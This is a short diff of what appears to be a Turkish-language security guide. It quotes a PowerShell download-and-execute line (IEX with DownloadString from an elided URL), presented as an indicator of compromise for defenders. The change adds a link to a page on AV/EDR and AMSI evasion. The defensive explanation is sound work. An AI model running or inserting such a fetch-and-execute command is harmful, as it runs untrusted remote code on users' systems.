@@ -114,7 +114,7 @@ Get-ChildItem C:\Data -Recurse -Filter *.log | Sort-Object Length -Descending | 
 > # (SADECE savunmayı ANLAMAK için — indir-çalıştır kalıbının neye benzediği)
 > IEX (New-Object Net.WebClient).DownloadString('http://.../script.ps1')
 > ```
-> Bu kalıbı loglarda görmek, klasik bir tehdit göstergesidir (IOC).
+> Bu kalıbı loglarda görmek, klasik bir tehdit göstergesidir (IOC). Saldırganın bu logları/AMSI'yi neden ve nasıl atlatmaya çalıştığı, savunmanın neden yine de kazandığı → [../10-pentest-metodolojisi/av-edr-atlatma.md](../10-pentest-metodolojisi/av-edr-atlatma.md).
 
 ---
 
